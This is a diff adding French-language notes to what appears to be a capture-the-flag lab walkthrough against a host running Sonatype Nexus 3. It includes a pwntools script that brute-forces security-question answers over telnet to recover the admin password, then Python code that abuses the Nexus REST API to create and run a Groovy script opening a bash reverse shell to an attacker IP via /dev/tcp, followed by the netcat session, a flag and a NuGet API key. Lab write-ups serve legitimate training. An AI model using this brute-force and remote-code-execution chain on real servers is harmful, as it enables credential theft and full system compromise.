@@ -56,6 +56,175 @@ On voit les 2 questions
 1.What is your zodiac sign?
 2.What is your favorite color?
 
+On va tenter de brute force 
+
+script brute force
+
+from pwn import *
+import time
+
+context.log_level = 'error'  # moins de bruit
+
+HOST, PORT = '192.168.58.159', 23
+
+SIGNS  = ['aries','taurus','gemini','cancer','leo','virgo','libra','scorpio','sagittarius','capricorn','aquarius','pisces']
+COLORS = ['blue','red','green','black','white','yellow','purple','pink','orange','brown','grey','gray','cyan','magenta']
+
+def try_combo(sign, color):
+    r = remote(HOST, PORT, timeout=3)
+    r.timeout = 0.8
+    try:
+        time.sleep(0.25)              # laisse la bannière arriver
+        r.recv(timeout=0.3)           # draine sans bloquer
+
+        # Q1
+        r.send(b'ANSONE\r\n')
+        time.sleep(0.15); r.recv(timeout=0.2)
+        r.send(sign.encode() + b'\r\n')
+
+        # Q2
+        time.sleep(0.15); r.recv(timeout=0.2)
+        r.send(b'ANSTWO\r\n')
+        time.sleep(0.15); r.recv(timeout=0.2)
+        r.send(color.encode() + b'\r\n')
+
+        # Recover
+        time.sleep(0.15); r.recv(timeout=0.2)
+        r.send(b'RECOVER\r\n')
+
+        out = r.recvall(timeout=1.5) or b''
+        low = out.lower()
+        ok = any(k in low for k in [b'password', b'recovered', b'new password', b'admin', b'success'])
+        return ok, out.decode('utf-8', 'ignore')
+    except EOFError:
+        return False, ''
+    finally:
+        with context.local(log_level='critical'):
+            try: r.close()
+            except: pass
+
+if __name__ == '__main__':
+    tried = 0
+    for s in SIGNS:
+        for c in COLORS:
+            for sign in {s, s.capitalize()}:
+                for color in {c, c.capitalize()}:
+                    tried += 1
+                    ok, out = try_combo(sign, color)
+                    print(f'{tried:03d} {sign}/{color} -> {"OK" if ok else "NOK"}')
+                    if ok:
+                        print('\n[RECOVER OUTPUT]\n' + out)
+                        exit(0)
+                    time.sleep(0.25)
+    print('Aucun couple trouvé dans ce set. Élargis les couleurs si besoin.')
 
 
+239 leo/black -> OK
 
+HINT
+1.What is your zodiac sign?
+2.What is your favorite color?
+ANSONE 
+Please Enter Answer
+ANSONE <answer>
+leo
+Correct!
+ANSTWO
+Please Enter Answer
+ANSTWO <answer>
+black
+Correct!
+RECOVER 
+<password>
+blackleo
+3e409e89-514c-4f9f-955e-dfa5c4083518
+
+La chaîne “3e409e89-514c-4f9f-955e-dfa5c4083518” a le format UUID utilisé par Nexus 3 comme mot de passe admin initial/récupéré.
+Connecte‑toi à l’UI Nexus du même hôte (port 8081) avec admin et ce mot de passe; l’UI peut te forcer à le changer au premier login.
+
+Ce script automatise l’exécution de code sur un Nexus Repository Manager authentifié.
+Il utilise l’API REST pour activer la “Capability” Script (si nécessaire), créer un script Groovy appelé pwn contenant un reverse shell, puis l’exécuter.
+L’authentification se fait en Basic Auth avec le compte admin et le mot de passe que tu as récupéré.
+Dans Nexus Repository Manager, une “capability” est une fonctionnalité que l’on peut activer/désactiver.
+La capability “Script” expose un moteur Groovy côté serveur via l’UI et l’API REST.
+Une fois activée, tu peux créer, stocker et exécuter des scripts Groovy nommés pour automatiser l’administration de Nexus.
+
+Le bloc de configuration définit la base d’URL de Nexus, les identifiants, et l’IP/port de ton listener.
+Ces valeurs sont utilisées dans les appels HTTP et injectées dans la commande du reverse shell.
+
+BASE = "http://192.168.58.159:8081"
+AUTH = ("admin", "3e409e89-514c-4f9f-955e-dfa5c4083518")
+ATTACKER_IP = "192.168.49.58"
+ATTACKER_PORT = 4444
+
+Le content est le script Groovy exécuté côté Nexus. 
+Il lance un process /bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" via ProcessBuilder,
+ce qui ouvre une connexion sortante vers ton listener et te donne un shell interactif.
+
+content = f'def cmd=["/bin/bash","-c","bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"]; new ProcessBuilder(cmd).redirectErrorStream(true).start()'
+
+L’API “Capabilities” est appelée pour activer la capability “script”.
+Certaines instances ne permettent pas l’API Script tant qu’elle n’est pas activée.
+Cet appel tente de l’activer; s’il échoue ou renvoie un code de conflit, ce n’est pas bloquant si elle est déjà active.
+
+cap = {"typeId":"script","enabled":True,"notes":"enable via API","properties":{}}
+requests.post(f"{BASE}/service/rest/v1/capabilities", auth=AUTH, json=cap)
+
+La création du script se fait via POST /service/rest/v1/script avec un JSON qui contient name, type et content.
+Si le script existe déjà, le code gère 409 Conflict en faisant un PUT sur /service/rest/v1/script/pwn pour mettre à jour uniquement le content.
+
+create = requests.post(f"{BASE}/service/rest/v1/script", auth=AUTH,
+                       headers={"Content-Type":"application/json"},
+                       json={"name":"pwn","type":"groovy","content":content})
+
+if create.status_code == 409:
+    requests.put(f"{BASE}/service/rest/v1/script/pwn", auth=AUTH,
+                 headers={"Content-Type":"application/json"},
+                 json={"content":content})
+
+L’exécution du script passe par POST /service/rest/v1/script/pwn/run.
+Cet endpoint attend Content-Type: text/plain (correction d’un 415 “Unsupported Media Type” si on envoie du JSON).
+Le corps peut être vide; il sert juste à déclencher l’exécution.
+
+run = requests.post(f"{BASE}/service/rest/v1/script/pwn/run", auth=AUTH,
+                    headers={"Content-Type":"text/plain"}, data="")
+
+Enfin, le script affiche les codes retours de création et d’exécution, ainsi qu’un extrait de la réponse.
+Pendant ce temps, tu dois avoir lancé ton listener nc -lvnp 4444 sur 192.168.49.58 pour recevoir le shell
+
+???(kali?kali)-[~]
+??$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.49.58] from (UNKNOWN) [192.168.58.159] 39940
+bash: cannot set terminal process group (959): Inappropriate ioctl for device
+bash: no job control in this shell
+nexus@sona:~/nexus-3.21.1-01$ 
+
+nexus@sona:/home$ ls
+ls
+nexus
+sona
+nexus@sona:/home$ cd sona
+cd sona
+nexus@sona:/home/sona$ ls
+ls
+local.txt
+logcrypt.py
+nexus@sona:/home/sona$ cat local.txt
+cat local.txt
+3887bc22c828597771da95256f6bedbe
+nexus@sona:/home/sona$ 
+
+passons au root.txt
+
+Nous savons de plus,
+"Your admin user password is located in
+/home/nexus/sonatype-work/nexus3/admin.password on the server."
+
+On s'est finalement connecté sur l'interface et login avec le mdp admin trouvé et cela nous a demandé un nouveau mdp , nous avons défini alicia
+
+Une NuGet API key est un jeton d’authentification utilisé par les clients NuGet pour réaliser des actions qui modifient l’état d’un dépôt NuGet
+
+NuGet API KEY
+b0573f25-3941-3b19-9414-9ef556bb296b
+nuget setapikey b0573f25-3941-3b19-9414-9ef556bb296b -source http://192.168.58.159:8081/repository/{repository name}/
